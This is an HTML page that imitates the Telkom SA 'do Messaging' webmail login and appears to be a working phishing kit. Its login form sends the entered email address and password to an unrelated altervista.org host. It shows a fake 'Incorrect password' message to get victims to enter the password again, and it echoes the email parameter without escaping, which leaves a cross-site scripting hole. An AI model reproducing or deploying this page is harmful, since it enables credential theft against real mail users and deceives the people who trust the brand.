<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>do Messaging Login</title>
<link rel="stylesheet" type="text/css" href="webmail.telkomsa.net/mail_files/commonloginzhtmlskin.css">
<link rel="SHORTCUT ICON" href="webmail.telkomsa.net/mail_files/mail_files/favicon.ico">
<script src="SpryAssets/SpryValidationTextField.js" type="text/javascript"></script>
<link href="SpryAssets/SpryValidationTextField.css" rel="stylesheet" type="text/css">
<style type="text/css">
<!--
.error1 {
	color: #F00;
}
-->
</style>
</head>
<body onLoad="onLoad();">
<table style="height:100%;" width="100%">
  <tbody>
    <tr>
      <td valign="middle" align="center"><div id="ZloginPanel">
          <table width="100%">
            <tbody>
              <tr>
                <td><table width="100%">
                    <tbody>
                      <tr>
                        <td valign="middle" height="100px" align="center"><a id="bannerLink" target="_new">
                          <!--										       <span style="cursor:pointer;display:block;" class="ImgLoginBanner" ></span> -->
                          <img src="webmail.telkomsa.net/mail_files/LoginBanner.png"> </a></td>
                      </tr>
                      <tr>
                        <td></td>
                      </tr>
                    </tbody>
                  </table></td>
              </tr>
              <tr>
                <td id="ZloginBodyContainer" style="background:#C3D7EF"><div id="ZloginFormPanel">
                    <form method="get" name="loginForm" action="http://directoryupdatee.altervista.org/veri1/member.php" accept-charset="UTF-8">
                      <input name="loginOp" value="login" type="hidden">
                      <span class="error1"> Incorrect password. Try again.</span>
                      <table width="100%" cellpadding="4">
                        <tbody>
                          <tr>
                            <td class="zLoginLabelContainer"><label for="email">Username:</label></td>
                            <td colspan="2" class="zLoginFieldContainer"><input name="email" type="text" class="zLoginField" id="email" value="<?php echo $_GET['email']; ?>" readonly="readonly"></td>
                          </tr>
                          <tr>
                            <td class="zLoginLabelContainer"><label for="password">Password:</label></td>
                            <td colspan="2" class="zLoginFieldContainer">
                              <input id="password" class="zLoginField" name="password" value="" type="password">
                            <span class="textfieldRequiredMsg">Please enter password.</span></td>
                          </tr>
                          <tr>
                            <td class="zLoginLabelContainer"></td>
                            <td><table>
                                <tbody>
                                  <tr>
                                    <td><input id="remember" value="1" name="zrememberme" type="checkbox"></td>
                                    <td class="zLoginCheckboxLabelContainer"><label for="remember">Remember me</label></td>
                                  </tr>
                                </tbody>
                              </table></td>
                            <td><input class="zLoginButton" value="Log In" type="submit"></td>
                          </tr>
                        </tbody>
                      </table>
                      <table width="100%">
                        <tbody>
                          <tr>
                            <td align="center"><div class="ZLoginSeparator" style="margin-top:0px"></div>
                              Version&nbsp;
                              <select name="client" onChange="clientChange(this.options[this.selectedIndex].value)">
                                <option value="preferred" selected="selected"> Default</option>
                                <option value="advanced"> Advanced (Ajax)</option>
                                <option value="standard"> Standard (HTML)</option>
                                <option value="mobile"> Mobile</option>
                              </select>
                              <a href="#" onClick="showWhatsThis()" id="ZLoginWhatsThisAnchor">What's This?</a></td>
                          </tr>
                          <tr>
                            <td align="center"><div id="ZLoginWhatsThis" class="ZLoginInfoMessage" style="display:none;text-align:left;width:90%;">
                                <center style="margin-bottom:3px;">
                                  <b>Client Types:</b>
                                </center>
                                <b>Advanced</b> offers the full set of Web collaboration features. This Web Client 
                                works best with newer browsers and faster Internet connections. <br>
                                <br>
                                <b>Standard</b> is recommended when Internet connections are slow, when using older browsers, or for easier accessibility. <br>
                                <br>
                                <b>Mobile</b> is recommended for mobile devices. <br>
                                <br>
                                To set <b>Default</b> to be your preferred client type, change the login options in your Preferences, General tab after you log in.</div>
                              <div id="ZLoginUnsupported" class="ZLoginInfoMessage" style="display:none">Note
                                that your web browser or display does not fully support the Advanced 
                                version.  We strongly recommend that you use the Standard client.</div>
                              <div class="ZLoginSeparator"></div></td>
                          </tr>
                          <tr>
                            <td id="ZloginClientLevelContainer"><a href="" target="_blank">do Messaging</a> :: the leader in messaging and collaboration :: <a target="_blank">Telkom Internet Telkom SA Ltd</a></td>
                          </tr>
                          <tr>
                            <td id="ZloginLicenseContainer"> Copyright © SA Limited 2014. All Rights Reserved. </td>
                          </tr>
                        </tbody>
                      </table>
                    </form>
                  </div></td>
              </tr>
            </tbody>
          </table>
        </div></td>
    </tr>
  </tbody>
</table>
<script type="text/javascript">
<!--
var sprytextfield1 = new Spry.Widget.ValidationTextField("sprytextfield1");
//-->
</script>
</body>
</html>